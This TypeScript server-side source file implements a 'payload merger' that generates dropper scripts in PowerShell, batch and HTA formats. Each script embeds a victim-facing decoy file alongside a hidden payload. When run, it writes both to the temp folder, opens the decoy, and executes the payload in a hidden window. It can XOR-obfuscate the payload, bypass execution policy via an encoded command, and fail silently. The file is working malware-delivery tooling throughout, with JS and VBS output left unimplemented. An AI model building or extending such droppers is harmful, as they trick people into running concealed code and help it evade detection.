
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const EncryptionSchema = z.object({
    type: z.literal('xor'),
    key: z.string(),
});

const MergePayloadsInputSchema = z.object({
  payload: FileInputSchema,
  benign: FileInputSchema,
  outputFormat: z.enum(['ps1', 'bat', 'hta', 'js', 'vbs']),
  encryption: EncryptionSchema.optional(),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

// XOR Encryption function
function xorEncrypt(data: string, key: string): string {
    let result = '';
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string, encryption?: z.infer<typeof EncryptionSchema>): string => {
    
    let payloadSection = `$payloadFileBytes = [System.Convert]::FromBase64String(@"
${payloadBase64}
"@)`;

    if (encryption && encryption.type === 'xor') {
        payloadSection = `
$encryptedBase64 = @"
${payloadBase64}
"@
$key = "${encryption.key}"
$encryptedBytes = [System.Convert]::FromBase64String($encryptedBase64)
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
$payloadFileBytes = New-Object byte[] $encryptedBytes.Length
for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
    $payloadFileBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}`;
    }
    
    return `
$tempPath = $env:TEMP
$benignFilePath = Join-Path $tempPath "${benignName}"
$payloadFilePath = Join-Path $tempPath "${payloadName}"

try {
    $benignFileBase64 = @"
${benignBase64}
"@
    
    ${payloadSection}
    
    [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
    [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)

    Start-Process $benignFilePath
    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
} catch {
    # Fail silently
}
`;
};


/**
 * Generates a dropper script that embeds two files.
 * When run, it drops the benign file, opens it, and executes the payload.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);
    const { payload, benign, outputFormat, encryption } = validatedInput;

    let payloadBase64 = decodeDataUri(payload.content);
    const benignBase64 = decodeDataUri(benign.content);

    if (encryption && encryption.type === 'xor') {
        // We encrypt the raw bytes, then Base64 encode the encrypted result
        const rawPayload = Buffer.from(payloadBase64, 'base64');
        const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryption.key), 'latin1');
        payloadBase64 = encryptedPayload.toString('base64');
    }
    
    let scriptContent = '';

    switch (outputFormat) {
        case 'ps1':
            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption);
            break;
        
        case 'bat':
            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption);
            const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
            scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
            break;

        case 'hta':
             let vbsPayloadSection = `payloadB64 = "${payloadBase64}"
                Call Base64ToFile(payloadB64, payloadFilePath)`;

            if (encryption && encryption.type === 'xor') {
                vbsPayloadSection = `
                encryptedB64 = "${payloadBase64}"
                key = "${encryption.key}"
                
                ' Decrypt the payload
                Dim encryptedBytes, keyBytes, i
                Set oXML = CreateObject("MSXML2.DOMDocument")
                Set oNode = oXML.CreateElement("base64")
                oNode.DataType = "bin.base64"
                oNode.Text = encryptedB64
                encryptedBytes = oNode.NodeTypedValue
                
                keyBytes = StrToBytes(key)
                
                For i = 0 To UBound(encryptedBytes)
                    encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
                Next
                
                ' Write decrypted bytes to file
                With CreateObject("ADODB.Stream")
                    .Type = 1 ' adTypeBinary
                    .Open
                    .Write encryptedBytes
                    .SaveToFile payloadFilePath, 2 ' adSaveCreateOverWrite
                    .Close
                End With
                `;
            }

            const vbsPayload = `
                Set objShell = CreateObject("WScript.Shell")
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                
                tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
                benignFilePath = tempPath & "\\${benign.name}"
                payloadFilePath = tempPath & "\\${payload.name}"

                benignB64 = "${benignBase64}"
                Call Base64ToFile(benignB64, benignFilePath)

                ${vbsPayloadSection}
                
                objShell.Run "cmd /c """ & benignFilePath & """", 0, True
                objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden

                ' Close the HTA window
                window.close()

                Sub Base64ToFile(B64, FileName)
                    Dim oXML, oNode
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = B64
                    With CreateObject("ADODB.Stream")
                        .Type = 1 ' adTypeBinary
                        .Open
                        .Write oNode.NodeTypedValue
                        .SaveToFile FileName, 2 ' adSaveCreateOverWrite
                        .Close
                    End With
                End Sub

                Function StrToBytes(s)
                    Dim bytes(), i
                    ReDim bytes(Len(s) - 1)
                    For i = 1 To Len(s)
                        bytes(i-1) = Asc(Mid(s, i, 1))
                    Next
                    StrToBytes = bytes
                End Function
            `;
            scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
            break;

        case 'js':
        case 'vbs':
            // These require more complex dropper logic using WScript.Shell
            // For now, return an error that it's not implemented yet.
             return {
              success: false,
              error: `Output format '${outputFormat}' is not yet fully supported for standalone script generation.`,
            };

        default:
             return { success: false, error: 'Invalid or unsupported output format.' };
    }

    return {
      success: true,
      scriptContent: scriptContent,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
